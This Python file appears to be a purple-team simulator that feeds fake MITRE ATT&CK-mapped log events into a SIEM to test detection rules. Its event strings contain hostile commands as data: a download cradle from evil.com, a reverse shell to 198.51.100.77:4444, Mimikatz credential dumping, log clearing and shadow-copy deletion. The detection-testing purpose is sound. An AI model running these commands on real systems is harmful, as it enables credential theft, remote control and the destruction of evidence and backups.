"""
Guardian SIEM - Purple Team Attack Simulator
==============================================
Generates realistic attack telemetry mapped to MITRE ATT&CK techniques.
Used for:
  - Validating detection rules (YAML + SIGMA)
  - Generating data for incident reports
  - Training SOC analysts on alert triage
  - Demonstrating SIEM capabilities in interviews/demos

Each "atomic test" simulates the *telemetry* an attack would produce,
NOT the attack itself. This is safe to run on any machine.

Usage:
    python attack_simulator.py                    # Run all tests
    python attack_simulator.py --technique T1003  # Run specific technique
    python attack_simulator.py --campaign apt29   # Run full campaign
    python attack_simulator.py --list             # List available tests
"""

import os
import sys
import json
import random
import argparse
import time
import sqlite3
from datetime import datetime, timedelta
from collections import defaultdict

# Add project root to path
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from event_bus import EventBus


class AtomicTest:
    """A single attack technique simulation."""

    def __init__(self, technique_id, technique_name, tactic, description,
                 events, expected_rules=None, severity="HIGH"):
        self.technique_id = technique_id
        self.technique_name = technique_name
        self.tactic = tactic
        self.description = description
        self.events = events  # List of (source, severity, message, enrichment) tuples
        self.expected_rules = expected_rules or []
        self.severity = severity


class AttackSimulator:
    """
    Purple Team attack simulator that generates MITRE ATT&CK-mapped
    telemetry and feeds it into Guardian's event pipeline.
    """

    def __init__(self):
        self.bus = EventBus()
        self.tests = {}
        self.campaigns = {}
        self.results = []
        self._register_all_tests()
        self._register_campaigns()

    def _register_all_tests(self):
        """Register all available atomic tests."""

        # ================================================================
        # T1003 - OS Credential Dumping (Mimikatz / LSASS)
        # ================================================================
        self.tests["T1003"] = AtomicTest(
            technique_id="T1003",
            technique_name="OS Credential Dumping",
            tactic="Credential Access",
            description="Simulates Mimikatz-style LSASS memory access for credential extraction.",
            expected_rules=["Malware Signature Match", "Suspicious PowerShell Execution"],
            severity="CRITICAL",
            events=[
                ("Windows_EventLog", "CRITICAL",
                 "Process access to LSASS.exe detected. Source: mimikatz.exe (PID 4402) "
                 "requested PROCESS_VM_READ on lsass.exe (PID 672). "
                 "GrantedAccess: 0x1010. User: CORP\\admin",
                 {"src_ip": "192.168.1.50", "rule_matched": "Credential Dumping",
                  "mitre_id": "T1003", "mitre_tactic": "Credential Access",
                  "threat_score": 95}),
                ("Windows_Sysmon", "CRITICAL",
                 "Event ID 10: ProcessAccess. SourceImage: C:\\Users\\admin\\Downloads\\mimikatz.exe "
                 "TargetImage: C:\\Windows\\System32\\lsass.exe "
                 "CallTrace: ntdll.dll!NtReadVirtualMemory",
                 {"src_ip": "192.168.1.50", "rule_matched": "LSASS Access",
                  "mitre_id": "T1003", "mitre_tactic": "Credential Access",
                  "threat_score": 98}),
                ("Windows_EventLog", "HIGH",
                 "Event ID 4672: Special privileges assigned to new logon. "
                 "Subject: CORP\\admin. Privileges: SeDebugPrivilege",
                 {"src_ip": "192.168.1.50", "rule_matched": "Privilege Escalation",
                  "mitre_id": "T1003", "mitre_tactic": "Credential Access",
                  "threat_score": 75}),
                ("Windows_PowerShell", "CRITICAL",
                 "PowerShell ScriptBlock logging: Invoke-Mimikatz -Command "
                 "'sekurlsa::logonpasswords' | Out-File C:\\temp\\creds.txt",
                 {"src_ip": "192.168.1.50", "rule_matched": "Suspicious PowerShell",
                  "mitre_id": "T1003", "mitre_tactic": "Credential Access",
                  "threat_score": 99}),
            ],
        )

        # ================================================================
        # T1110 - Brute Force
        # ================================================================
        attacker_ip = "203.0.113.42"
        brute_events = []
        for i in range(12):
            brute_events.append((
                "Windows_EventLog", "MEDIUM",
                f"Event ID 4625: An account failed to log on. "
                f"Subject: NT AUTHORITY\\SYSTEM. Target: CORP\\administrator. "
                f"Logon Type: 10 (RemoteInteractive). Source IP: {attacker_ip}. "
                f"Failure Reason: Unknown user name or bad password. Attempt {i+1}",
                {"src_ip": attacker_ip, "mitre_id": "T1110",
                 "mitre_tactic": "Credential Access", "threat_score": 40 + i * 3,
                 "geo_country": "RU", "geo_city": "Moscow"},
            ))
        # Successful login after brute force
        brute_events.append((
            "Windows_EventLog", "CRITICAL",
            f"Event ID 4624: An account was successfully logged on. "
            f"Subject: CORP\\administrator. Logon Type: 10 (RemoteInteractive). "
            f"Source IP: {attacker_ip}. After 12 failed attempts.",
            {"src_ip": attacker_ip, "rule_matched": "Brute Force - Successful",
             "mitre_id": "T1110", "mitre_tactic": "Credential Access",
             "threat_score": 90, "geo_country": "RU", "geo_city": "Moscow"},
        ))
        self.tests["T1110"] = AtomicTest(
            technique_id="T1110",
            technique_name="Brute Force",
            tactic="Credential Access",
            description="Simulates 12 failed RDP login attempts followed by a successful breach.",
            expected_rules=["Brute Force Detection"],
            severity="HIGH",
            events=brute_events,
        )

        # ================================================================
        # T1059.001 - PowerShell Command Execution
        # ================================================================
        self.tests["T1059.001"] = AtomicTest(
            technique_id="T1059.001",
            technique_name="PowerShell",
            tactic="Execution",
            description="Simulates malicious PowerShell with encoded commands and download cradle.",
            expected_rules=["Reverse Shell Indicator", "Suspicious PowerShell Execution"],
            severity="CRITICAL",
            events=[
                ("Windows_PowerShell", "CRITICAL",
                 "PowerShell ScriptBlock ID 0xAB12: "
                 "IEX(New-Object Net.WebClient).downloadstring('http://evil.com/payload.ps1') "
                 "| Invoke-Expression",
                 {"src_ip": "192.168.1.50", "rule_matched": "PowerShell Download Cradle",
                  "mitre_id": "T1059.001", "mitre_tactic": "Execution",
                  "threat_score": 92}),
                ("Windows_Sysmon", "HIGH",
                 "Event ID 1: Process Create. Image: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe "
                 "CommandLine: powershell.exe -NoP -NonI -W Hidden -Enc SQBFAFgAKABOAGUAdwA= "
                 "ParentImage: C:\\Windows\\System32\\cmd.exe User: CORP\\jsmith",
                 {"src_ip": "192.168.1.50", "rule_matched": "Encoded PowerShell",
                  "mitre_id": "T1059.001", "mitre_tactic": "Execution",
                  "threat_score": 88}),
                ("Windows_PowerShell", "HIGH",
                 "PowerShell Module logging: Invoke-WebRequest -Uri 'http://203.0.113.99/beacon.exe' "
                 "-OutFile 'C:\\Users\\Public\\svchost.exe'; "
                 "Start-Process 'C:\\Users\\Public\\svchost.exe' -WindowStyle Hidden",
                 {"src_ip": "192.168.1.50", "rule_matched": "Suspicious Download",
                  "mitre_id": "T1059.001", "mitre_tactic": "Execution",
                  "threat_score": 85}),
            ],
        )

        # ================================================================
        # T1046 - Network Service Scanning
        # ================================================================
        target_ips = ["10.0.0.1", "10.0.0.2", "10.0.0.5", "10.0.0.10", "10.0.0.20"]
        scan_events = []
        for target in target_ips:
            for port in [22, 80, 443, 445, 3389, 8080, 8443]:
                scan_events.append((
                    "Network_IPS", "LOW",
                    f"SYN scan detected: 192.168.1.100 -> {target}:{port} "
                    f"(connection attempt, no response)",
                    {"src_ip": "192.168.1.100", "mitre_id": "T1046",
                     "mitre_tactic": "Discovery", "threat_score": 15},
                ))
        # Summary event
        scan_events.append((
            "Network_IPS", "MEDIUM",
            f"Port scan summary: 192.168.1.100 scanned 35 ports across 5 hosts in 8 seconds. "
            f"Open ports found: 10.0.0.1:22, 10.0.0.1:80, 10.0.0.5:445, 10.0.0.10:3389",
            {"src_ip": "192.168.1.100", "rule_matched": "Port Scan Detection",
             "mitre_id": "T1046", "mitre_tactic": "Discovery", "threat_score": 55},
        ))
        self.tests["T1046"] = AtomicTest(
            technique_id="T1046",
            technique_name="Network Service Scanning",
            tactic="Discovery",
            description="Simulates Nmap-style SYN scan across 5 internal hosts on common ports.",
            expected_rules=["Port Scan Detection"],
            severity="MEDIUM",
            events=scan_events,
        )

        # ================================================================
        # T1070.001 - Indicator Removal: Clear Windows Event Logs
        # ================================================================
        self.tests["T1070.001"] = AtomicTest(
            technique_id="T1070.001",
            technique_name="Clear Windows Event Logs",
            tactic="Defense Evasion",
            description="Simulates an attacker clearing Security event logs to cover tracks.",
            expected_rules=["Log Tampering", "Clearing Windows Event Logs"],
            severity="CRITICAL",
            events=[
                ("Windows_EventLog", "CRITICAL",
                 "Event ID 1102: The audit log was cleared. "
                 "Subject: CORP\\compromised_admin. "
                 "LogName: Security. This action was performed by wevtutil.exe",
                 {"src_ip": "192.168.1.50", "rule_matched": "Log Tampering",
                  "mitre_id": "T1070.001", "mitre_tactic": "Defense Evasion",
                  "threat_score": 97}),
                ("Windows_Sysmon", "HIGH",
                 "Event ID 1: Process Create. Image: C:\\Windows\\System32\\wevtutil.exe "
                 "CommandLine: wevtutil cl Security "
                 "ParentImage: C:\\Windows\\System32\\cmd.exe User: CORP\\compromised_admin",
                 {"src_ip": "192.168.1.50", "rule_matched": "Event Log Manipulation",
                  "mitre_id": "T1070.001", "mitre_tactic": "Defense Evasion",
                  "threat_score": 85}),
            ],
        )

        # ================================================================
        # T1543.003 - Create or Modify System Process: Windows Service
        # ================================================================
        self.tests["T1543.003"] = AtomicTest(
            technique_id="T1543.003",
            technique_name="Windows Service Persistence",
            tactic="Persistence",
            description="Simulates a malicious service installation for persistence.",
            expected_rules=["Suspicious Service Installation"],
            severity="HIGH",
            events=[
                ("Windows_EventLog", "HIGH",
                 "Event ID 7045: A service was installed in the system. "
                 "Service Name: WindowsUpdateHelper. "
                 "Service File Name: C:\\ProgramData\\svchost.exe -k netsvcs. "
                 "Service Type: user mode service. Service Start Type: auto start. "
                 "Account: LocalSystem",
                 {"src_ip": "192.168.1.50", "rule_matched": "Suspicious Service Install",
                  "mitre_id": "T1543.003", "mitre_tactic": "Persistence",
                  "threat_score": 80}),
                ("Windows_Sysmon", "HIGH",
                 "Event ID 1: Process Create. Image: C:\\Windows\\System32\\sc.exe "
                 "CommandLine: sc create WindowsUpdateHelper binPath= "
                 "\"C:\\ProgramData\\svchost.exe -k netsvcs\" start= auto "
                 "User: CORP\\compromised_admin",
                 {"src_ip": "192.168.1.50", "rule_matched": "Service Creation via SC",
                  "mitre_id": "T1543.003", "mitre_tactic": "Persistence",
                  "threat_score": 78}),
            ],
        )

        # ================================================================
        # T1041 - Exfiltration Over C2 Channel
        # ================================================================
        self.tests["T1041"] = AtomicTest(
            technique_id="T1041",
            technique_name="Exfiltration Over C2 Channel",
            tactic="Exfiltration",
            description="Simulates large data transfer to external C2 server.",
            expected_rules=["Data Exfiltration Indicator"],
            severity="CRITICAL",
            events=[
                ("Network_IPS", "HIGH",
                 "Large outbound transfer detected: 192.168.1.50 -> 198.51.100.77:443 "
                 "transferred 847 MB in 12 minutes. Protocol: HTTPS. "
                 "Normal baseline for this host: 50 MB/day",
                 {"src_ip": "192.168.1.50", "rule_matched": "Data Exfiltration",
                  "mitre_id": "T1041", "mitre_tactic": "Exfiltration",
                  "threat_score": 88, "geo_country": "CN", "geo_city": "Shanghai"}),
                ("Network_IPS", "MEDIUM",
                 "DNS query volume anomaly: 192.168.1.50 made 2,847 DNS queries in 10 minutes "
                 "to subdomain pattern: *.data.evil-domain.com (possible DNS exfiltration)",
                 {"src_ip": "192.168.1.50", "rule_matched": "DNS Exfiltration",
                  "mitre_id": "T1041", "mitre_tactic": "Exfiltration",
                  "threat_score": 75}),
            ],
        )

        # ================================================================
        # T1059 - Reverse Shell
        # ================================================================
        self.tests["T1059"] = AtomicTest(
            technique_id="T1059",
            technique_name="Command and Scripting Interpreter",
            tactic="Execution",
            description="Simulates reverse shell establishment via PowerShell.",
            expected_rules=["Reverse Shell Indicator"],
            severity="CRITICAL",
            events=[
                ("Windows_Sysmon", "CRITICAL",
                 "Event ID 1: Process Create. Image: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe "
                 "CommandLine: powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient"
                 "('198.51.100.77',4444);$stream = $client.GetStream();\" "
                 "ParentImage: C:\\Windows\\System32\\cmd.exe User: CORP\\jsmith",
                 {"src_ip": "192.168.1.50", "rule_matched": "Reverse Shell",
                  "mitre_id": "T1059", "mitre_tactic": "Execution",
                  "threat_score": 99}),
                ("Network_IPS", "CRITICAL",
                 "Outbound connection to known C2: 192.168.1.50 -> 198.51.100.77:4444 "
                 "Protocol: TCP. Connection type: reverse shell pattern (interactive TTY). "
                 "Threat intel match: IP flagged by AbuseIPDB (confidence: 97%)",
                 {"src_ip": "198.51.100.77", "rule_matched": "C2 Communication",
                  "mitre_id": "T1059", "mitre_tactic": "Execution",
                  "threat_score": 97, "geo_country": "RU", "geo_city": "Saint Petersburg"}),
            ],
        )

        # ================================================================
        # T1558.003 - Kerberoasting
        # ================================================================
        self.tests["T1558.003"] = AtomicTest(
            technique_id="T1558.003",
            technique_name="Kerberoasting",
            tactic="Credential Access",
            description="Simulates Kerberoasting attack requesting RC4-encrypted service tickets.",
            expected_rules=["Kerberoasting Detection"],
            severity="HIGH",
            events=[
                ("Windows_EventLog", "HIGH",
                 "Event ID 4769: A Kerberos service ticket was requested. "
                 "Account: CORP\\jsmith. Service: MSSQLSvc/sql01.corp.local:1433. "
                 "Ticket Encryption: 0x17 (RC4-HMAC). Client Address: 192.168.1.50. "
                 "This encryption type is deprecated and commonly abused.",
                 {"src_ip": "192.168.1.50", "rule_matched": "Kerberoasting",
                  "mitre_id": "T1558.003", "mitre_tactic": "Credential Access",
                  "threat_score": 82}),
                ("Windows_EventLog", "HIGH",
                 "Event ID 4769: A Kerberos service ticket was requested. "
                 "Account: CORP\\jsmith. Service: HTTP/web01.corp.local. "
                 "Ticket Encryption: 0x17 (RC4-HMAC). Client Address: 192.168.1.50",
                 {"src_ip": "192.168.1.50", "rule_matched": "Kerberoasting",
                  "mitre_id": "T1558.003", "mitre_tactic": "Credential Access",
                  "threat_score": 82}),
                ("Windows_EventLog", "HIGH",
                 "Event ID 4769: A Kerberos service ticket was requested. "
                 "Account: CORP\\jsmith. Service: CIFS/file01.corp.local. "
                 "Ticket Encryption: 0x17 (RC4-HMAC). Client Address: 192.168.1.50. "
                 "3 RC4 service ticket requests from same user in 30 seconds - anomalous",
                 {"src_ip": "192.168.1.50", "rule_matched": "Kerberoasting",
                  "mitre_id": "T1558.003", "mitre_tactic": "Credential Access",
                  "threat_score": 90}),
            ],
        )

        # ================================================================
        # T1021.001 - Remote Desktop Protocol (Lateral Movement)
        # ================================================================
        self.tests["T1021.001"] = AtomicTest(
            technique_id="T1021.001",
            technique_name="Remote Desktop Protocol",
            tactic="Lateral Movement",
            description="Simulates lateral movement via RDP from a compromised workstation.",
            expected_rules=["Unauthorized Access Attempt"],
            severity="HIGH",
            events=[
                ("Windows_EventLog", "MEDIUM",
                 "Event ID 4624: Logon Type 10 (RemoteInteractive). "
                 "Account: CORP\\compromised_admin. Source IP: 192.168.1.50. "
                 "Target: DC01.corp.local. Anomaly: This account has never used RDP before.",
                 {"src_ip": "192.168.1.50", "rule_matched": "Anomalous RDP Login",
                  "mitre_id": "T1021.001", "mitre_tactic": "Lateral Movement",
                  "threat_score": 65}),
                ("Windows_EventLog", "HIGH",
                 "Event ID 4624: Logon Type 10 (RemoteInteractive). "
                 "Account: CORP\\compromised_admin. Source IP: 192.168.1.50. "
                 "Target: FILE01.corp.local. Second RDP session from same host in 5 minutes.",
                 {"src_ip": "192.168.1.50", "rule_matched": "Lateral Movement",
                  "mitre_id": "T1021.001", "mitre_tactic": "Lateral Movement",
                  "threat_score": 78}),
            ],
        )

        # ================================================================
        # T1486 - Data Encrypted for Impact (Ransomware)
        # ================================================================
        self.tests["T1486"] = AtomicTest(
            technique_id="T1486",
            technique_name="Data Encrypted for Impact",
            tactic="Impact",
            description="Simulates ransomware file encryption activity and ransom note creation.",
            expected_rules=["Malware Signature Match"],
            severity="CRITICAL",
            events=[
                ("FileMonitor", "CRITICAL",
                 "Rapid file modification detected: 847 files renamed with .encrypted extension "
                 "in C:\\Users\\Public\\Documents\\ within 45 seconds. "
                 "Process: C:\\ProgramData\\svchost.exe (PID 6612). "
                 "This matches ransomware encryption behavior.",
                 {"src_ip": "192.168.1.50", "rule_matched": "Ransomware Activity",
                  "mitre_id": "T1486", "mitre_tactic": "Impact",
                  "threat_score": 99}),
                ("FileMonitor", "CRITICAL",
                 "Ransom note created: C:\\Users\\Public\\Documents\\README_DECRYPT.txt. "
                 "Content preview: 'Your files have been encrypted. Send 2 BTC to...' "
                 "Process: C:\\ProgramData\\svchost.exe (PID 6612)",
                 {"src_ip": "192.168.1.50", "rule_matched": "Ransomware Note",
                  "mitre_id": "T1486", "mitre_tactic": "Impact",
                  "threat_score": 100}),
                ("Windows_EventLog", "CRITICAL",
                 "Volume Shadow Copy deleted: vssadmin delete shadows /all /quiet. "
                 "User: CORP\\compromised_admin. "
                 "Shadow copy deletion prevents file recovery.",
                 {"src_ip": "192.168.1.50", "rule_matched": "Shadow Copy Deletion",
                  "mitre_id": "T1486", "mitre_tactic": "Impact",
                  "threat_score": 95}),
            ],
        )

    def _register_campaigns(self):
        """Register multi-technique attack campaigns."""

        # APT29 (Cozy Bear) style campaign
        self.campaigns["apt29"] = {
            "name": "APT29 (Cozy Bear) - Full Kill Chain",
            "description": (
                "Simulates an APT29-style intrusion: initial access via phishing, "
                "PowerShell execution, credential dumping, lateral movement, "
                "data collection, and exfiltration."
            ),
            "techniques": [
                "T1059.001",    # PowerShell execution (Initial foothold)
                "T1003",        # Credential dumping (Mimikatz)
                "T1558.003",    # Kerberoasting (Privilege escalation)
                "T1021.001",    # RDP lateral movement
                "T1070.001",    # Clear event logs (Cover tracks)
                "T1041",        # Data exfiltration
            ],
        }

        # Ransomware campaign
        self.campaigns["ransomware"] = {
            "name": "Ransomware Operator - Full Deployment",
            "description": (
                "Simulates a human-operated ransomware attack: brute force entry, "
                "network scanning, persistence, credential theft, and encryption."
            ),
            "techniques": [
                "T1110",        # Brute force RDP
                "T1046",        # Network scanning
                "T1543.003",    # Service persistence
                "T1003",        # Credential dumping
                "T1070.001",    # Cover tracks
                "T1486",        # Ransomware encryption
            ],
        }

        # Insider threat
        self.campaigns["insider"] = {
            "name": "Insider Threat - Data Theft",
            "description": (
                "Simulates a malicious insider with valid credentials performing "
                "reconnaissance and exfiltrating sensitive data."
            ),
            "techniques": [
                "T1046",        # Network scanning
                "T1041",        # Data exfiltration
                "T1070.001",    # Clear logs
            ],
        }

    def run_test(self, technique_id, delay=0.3):
        """
        Execute a single atomic test, emitting events into the SIEM pipeline.

        Args:
            technique_id: MITRE ATT&CK technique ID (e.g., "T1003")
            delay: Seconds between events (simulates real-time arrival)

        Returns:
            Dict with test results and detection coverage
        """
        test = self.tests.get(technique_id)
        if not test:
            print(f"  [!] Unknown technique: {technique_id}")
            return None

        print(f"\n  {'='*60}")
        print(f"  ATOMIC TEST: {test.technique_id} - {test.technique_name}")
        print(f"  Tactic: {test.tactic}")
        print(f"  Description: {test.description}")
        print(f"  Events to generate: {len(test.events)}")
        print(f"  {'='*60}")

        events_emitted = 0
        for source, severity, message, enrichment in test.events:
            self.bus.emit(source, severity, message, enrichment=enrichment)
            events_emitted += 1
            if delay > 0:
                time.sleep(delay)

        result = {
            "technique_id": test.technique_id,
            "technique_name": test.technique_name,
            "tactic": test.tactic,
            "events_emitted": events_emitted,
            "expected_rules": test.expected_rules,
            "severity": test.severity,
            "timestamp": datetime.now().isoformat(),
            "status": "COMPLETED",
        }

        self.results.append(result)
        print(f"  [+] Emitted {events_emitted} events for {test.technique_id}")
        return result

    def run_campaign(self, campaign_id, delay=0.5):
        """
        Execute a full attack campaign (multiple techniques in sequence).

        Args:
            campaign_id: Campaign identifier (e.g., "apt29")
            delay: Seconds between events

        Returns:
            Dict with campaign results
        """
        campaign = self.campaigns.get(campaign_id)
        if not campaign:
            print(f"[!] Unknown campaign: {campaign_id}")
            return None

        print(f"\n{'#'*65}")
        print(f"  CAMPAIGN: {campaign['name']}")
        print(f"  {campaign['description']}")
        print(f"  Techniques: {len(campaign['techniques'])}")
        print(f"{'#'*65}")

        campaign_results = []
        for technique_id in campaign["techniques"]:
            result = self.run_test(technique_id, delay=delay)
            if result:
                campaign_results.append(result)
            time.sleep(1)  # Pause between techniques

        total_events = sum(r["events_emitted"] for r in campaign_results)
        summary = {
            "campaign": campaign["name"],
            "techniques_executed": len(campaign_results),
            "total_events": total_events,
            "timestamp": datetime.now().isoformat(),
            "results": campaign_results,
        }

        print(f"\n  {'='*60}")
        print(f"  CAMPAIGN COMPLETE: {campaign['name']}")
        print(f"  Techniques: {len(campaign_results)}")
        print(f"  Total Events: {total_events}")
        print(f"  {'='*60}")

        return summary

    def run_all_tests(self, delay=0.2):
        """Execute all registered atomic tests."""
        print("\n" + "=" * 65)
        print("  GUARDIAN SIEM - PURPLE TEAM: Full Test Suite")
        print("=" * 65)

        for technique_id in sorted(self.tests.keys()):
            self.run_test(technique_id, delay=delay)

        total = sum(r["events_emitted"] for r in self.results)
        print(f"\n  SUITE COMPLETE: {len(self.results)} techniques, {total} events emitted")
        return self.results

    def list_tests(self):
        """Print all available atomic tests and campaigns."""
        print("\n  Available Atomic Tests:")
        print("  " + "-" * 55)
        for tid in sorted(self.tests.keys()):
            t = self.tests[tid]
            print(f"    {t.technique_id:<15} {t.technique_name:<35} [{t.tactic}]")

        print(f"\n  Available Campaigns:")
        print("  " + "-" * 55)
        for cid, c in self.campaigns.items():
            print(f"    {cid:<15} {c['name']}")
            print(f"                    Techniques: {', '.join(c['techniques'])}")

    def get_detection_coverage(self):
        """
        Analyze which tests were detected by existing rules.
        Returns a coverage report.
        """
        db_path = os.path.join(os.path.dirname(os.path.abspath(__file__)),
                               "database", "guardian_events.db")
        if not os.path.isfile(db_path):
            return {"error": "No events database found. Run tests first."}

        conn = sqlite3.connect(db_path)
        conn.row_factory = sqlite3.Row

        coverage = []
        for tid, test in sorted(self.tests.items()):
            # Check how many events for this technique have rule matches
            rows = conn.execute(
                "SELECT COUNT(*) as total, "
                "SUM(CASE WHEN rule_matched != '' THEN 1 ELSE 0 END) as detected "
                "FROM events WHERE mitre_id = ?",
                (test.technique_id,)
            ).fetchone()

            total = rows["total"] if rows else 0
            detected = rows["detected"] if rows else 0

            coverage.append({
                "technique_id": test.technique_id,
                "technique_name": test.technique_name,
                "tactic": test.tactic,
                "events_total": total,
                "events_detected": detected,
                "coverage_pct": round(detected / total * 100, 1) if total > 0 else 0,
                "status": "DETECTED" if detected > 0 else "GAP",
                "expected_rules": test.expected_rules,
            })

        conn.close()

        detected_count = sum(1 for c in coverage if c["status"] == "DETECTED")
        return {
            "total_techniques": len(coverage),
            "detected": detected_count,
            "gaps": len(coverage) - detected_count,
            "overall_coverage": round(detected_count / len(coverage) * 100, 1) if coverage else 0,
            "techniques": coverage,
        }


def main():
    parser = argparse.ArgumentParser(
        description="Guardian SIEM - Purple Team Attack Simulator",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python attack_simulator.py --list                 List all tests and campaigns
  python attack_simulator.py --all                  Run all atomic tests
  python attack_simulator.py --technique T1003      Run credential dumping test
  python attack_simulator.py --campaign apt29       Run APT29 kill chain
  python attack_simulator.py --campaign ransomware  Run ransomware campaign
  python attack_simulator.py --coverage             Show detection coverage report
        """
    )
    parser.add_argument("--technique", "-t", help="Run a specific MITRE technique (e.g., T1003)")
    parser.add_argument("--campaign", "-c", help="Run an attack campaign (e.g., apt29, ransomware)")
    parser.add_argument("--all", "-a", action="store_true", help="Run all atomic tests")
    parser.add_argument("--list", "-l", action="store_true", help="List available tests and campaigns")
    parser.add_argument("--coverage", action="store_true", help="Show detection coverage report")
    parser.add_argument("--delay", "-d", type=float, default=0.2, help="Delay between events (seconds)")

    args = parser.parse_args()
    sim = AttackSimulator()

    print("\n" + "=" * 65)
    print("  Guardian SIEM - Purple Team Attack Simulator")
    print("  Generates MITRE ATT&CK-mapped telemetry for detection validation")
    print("=" * 65)

    if args.list:
        sim.list_tests()
    elif args.technique:
        sim.run_test(args.technique, delay=args.delay)
    elif args.campaign:
        sim.run_campaign(args.campaign, delay=args.delay)
    elif args.coverage:
        report = sim.get_detection_coverage()
        if "error" in report:
            print(f"\n  [!] {report['error']}")
        else:
            print(f"\n  Detection Coverage Report")
            print(f"  {'='*55}")
            print(f"  Total Techniques: {report['total_techniques']}")
            print(f"  Detected:         {report['detected']}")
            print(f"  Gaps:             {report['gaps']}")
            print(f"  Coverage:         {report['overall_coverage']}%")
            print(f"\n  {'Technique':<15} {'Name':<30} {'Status':<10} {'Coverage'}")
            print(f"  {'-'*15} {'-'*30} {'-'*10} {'-'*10}")
            for t in report["techniques"]:
                status_icon = "PASS" if t["status"] == "DETECTED" else "FAIL"
                print(f"  {t['technique_id']:<15} {t['technique_name']:<30} {status_icon:<10} {t['coverage_pct']}%")
    elif args.all:
        sim.run_all_tests(delay=args.delay)
        print("\n  Run --coverage to see detection results.")
    else:
        parser.print_help()


if __name__ == "__main__":
    main()
